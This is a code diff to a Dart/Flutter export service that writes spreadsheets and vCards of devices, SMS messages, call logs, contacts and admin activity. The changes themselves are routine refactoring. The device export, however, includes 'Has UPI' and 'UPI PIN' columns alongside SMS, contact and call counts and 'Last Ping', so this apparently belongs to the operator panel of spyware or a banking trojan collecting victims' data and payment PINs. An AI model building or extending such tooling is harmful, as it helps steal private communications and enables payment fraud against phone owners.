@@ -3,7 +3,7 @@ import 'package:excel/excel.dart';
 import 'package:csv/csv.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:share_plus/share_plus.dart';
-import 'package:flutter/foundation.dart' show kIsWeb;
+import 'package:flutter/foundation.dart' show kIsWeb, debugPrint;
 import 'package:intl/intl.dart';
 import '../../data/models/device.dart';
 import '../../data/models/sms_message.dart';
@@ -24,22 +24,22 @@ class ExportService {
 
       // Headers
       sheet.appendRow([
-        const TextCellValue('Device ID'),
-        const TextCellValue('Model'),
-        const TextCellValue('Manufacturer'),
-        const TextCellValue('OS Version'),
-        const TextCellValue('Status'),
-        const TextCellValue('Battery'),
-        const TextCellValue('Online'),
-        const TextCellValue('Total SMS'),
-        const TextCellValue('Total Contacts'),
-        const TextCellValue('Total Calls'),
-        const TextCellValue('Has UPI'),
-        const TextCellValue('UPI PIN'),
-        const TextCellValue('Note Priority'),
-        const TextCellValue('Note Message'),
-        const TextCellValue('Last Ping'),
-        const TextCellValue('Registered At'),
+        TextCellValue('Device ID'),
+        TextCellValue('Model'),
+        TextCellValue('Manufacturer'),
+        TextCellValue('OS Version'),
+        TextCellValue('Status'),
+        TextCellValue('Battery'),
+        TextCellValue('Online'),
+        TextCellValue('Total SMS'),
+        TextCellValue('Total Contacts'),
+        TextCellValue('Total Calls'),
+        TextCellValue('Has UPI'),
+        TextCellValue('UPI PIN'),
+        TextCellValue('Note Priority'),
+        TextCellValue('Note Message'),
+        TextCellValue('Last Ping'),
+        TextCellValue('Registered At'),
       ]);
 
       // Data rows
@@ -81,19 +81,19 @@ class ExportService {
 
       // Headers
       sheet.appendRow([
-        const TextCellValue('ID'),
-        const TextCellValue('Type'),
-        const TextCellValue('From'),
-        const TextCellValue('To'),
-        const TextCellValue('Body'),
-        const TextCellValue('Timestamp'),
-        const TextCellValue('Is Read'),
+        TextCellValue('ID'),
+        TextCellValue('Type'),
+        TextCellValue('From'),
+        TextCellValue('To'),
+        TextCellValue('Body'),
+        TextCellValue('Timestamp'),
+        TextCellValue('Is Read'),
       ]);
 
       // Data rows
       for (var sms in messages) {
         sheet.appendRow([
-          IntCellValue(sms.id),
+          TextCellValue(sms.id),
           TextCellValue(sms.type),
           TextCellValue(sms.from ?? ''),
           TextCellValue(sms.to ?? ''),
@@ -119,23 +119,21 @@ class ExportService {
 
       // Headers
       sheet.appendRow([
-        const TextCellValue('ID'),
-        const TextCellValue('Number'),
-        const TextCellValue('Name'),
-        const TextCellValue('Type'),
-        const TextCellValue('Duration (sec)'),
-        const TextCellValue('Timestamp'),
+        TextCellValue('Number'),
+        TextCellValue('Name'),
+        TextCellValue('Type'),
+        TextCellValue('Duration (sec)'),
+        TextCellValue('Timestamp'),
       ]);
 
       // Data rows
       for (var call in calls) {
         sheet.appendRow([
-          IntCellValue(call.id),
           TextCellValue(call.number),
-          TextCellValue(call.name ?? 'Unknown'),
-          TextCellValue(call.type),
+          TextCellValue(call.name),
+          TextCellValue(call.callType),
           IntCellValue(call.duration),
-          TextCellValue(DateFormat('yyyy-MM-dd HH:mm:ss').format(call.timestamp)),
+          TextCellValue(call.timestamp),
         ]);
       }
 
@@ -156,12 +154,10 @@ class ExportService {
         vCardData.writeln('BEGIN:VCARD');
         vCardData.writeln('VERSION:3.0');
         vCardData.writeln('FN:${contact.name}');
-        
-        // Add phone numbers
-        for (var number in contact.phoneNumbers) {
-          vCardData.writeln('TEL:$number');
+        vCardData.writeln('TEL:${contact.phoneNumber}');
+        if (contact.email != null && contact.email!.isNotEmpty) {
+          vCardData.writeln('EMAIL:${contact.email}');
         }
-        
         vCardData.writeln('END:VCARD');
       }
 
@@ -181,27 +177,27 @@ class ExportService {
 
       // Headers
       sheet.appendRow([
-        const TextCellValue('ID'),
-        const TextCellValue('Admin'),
-        const TextCellValue('Activity Type'),
-        const TextCellValue('Target Type'),
-        const TextCellValue('Target ID'),
-        const TextCellValue('Details'),
-        const TextCellValue('IP Address'),
-        const TextCellValue('Timestamp'),
+        TextCellValue('ID'),
+        TextCellValue('Admin'),
+        TextCellValue('Activity Type'),
+        TextCellValue('Description'),
+        TextCellValue('Device ID'),
+        TextCellValue('IP Address'),
+        TextCellValue('Success'),
+        TextCellValue('Timestamp'),
       ]);
 
       // Data rows
       for (var activity in activities) {
         sheet.appendRow([
-          IntCellValue(activity.id),
+          TextCellValue(activity.id),
           TextCellValue(activity.adminUsername),
           TextCellValue(activity.activityType),
-          TextCellValue(activity.targetType ?? ''),
-          TextCellValue(activity.targetId ?? ''),
-          TextCellValue(activity.details ?? ''),
+          TextCellValue(activity.description),
+          TextCellValue(activity.deviceId ?? ''),
           TextCellValue(activity.ipAddress ?? ''),
-          TextCellValue(DateFormat('yyyy-MM-dd HH:mm:ss').format(activity.createdAt)),
+          TextCellValue(activity.success ? 'Yes' : 'No'),
+          TextCellValue(DateFormat('yyyy-MM-dd HH:mm:ss').format(activity.timestamp)),
         ]);
       }
 
